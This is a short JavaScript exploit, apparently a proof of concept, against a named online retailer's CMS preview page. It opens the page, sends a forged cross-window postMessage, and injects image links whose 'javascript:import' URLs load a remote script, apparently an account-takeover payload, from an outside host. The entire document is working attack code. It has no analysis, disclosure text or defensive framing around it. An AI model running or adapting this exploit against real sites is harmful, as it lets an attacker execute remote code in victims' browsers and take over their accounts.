var w = window.open('https://eur.halara.com/cmspreview');
setTimeout(function() {
  var msg = '/*framebus*/' + JSON.stringify({
    event: 'message',
    origin: '*',
    eventData: {
      dataIndex: 1,
      contents: [{
        type: 'collections',
        title: 'Click any image',
        position: 1,
        data: [
          { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' },
          { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' },
          { url: 'javascript:import("https://daemoon.me/Halara/ato.js")', img: 'https://daemoon.me/daemoon.jpeg', title: 'x' }
        ]
      }]
    }
  });
  w.postMessage(msg, '*');
}, 3000);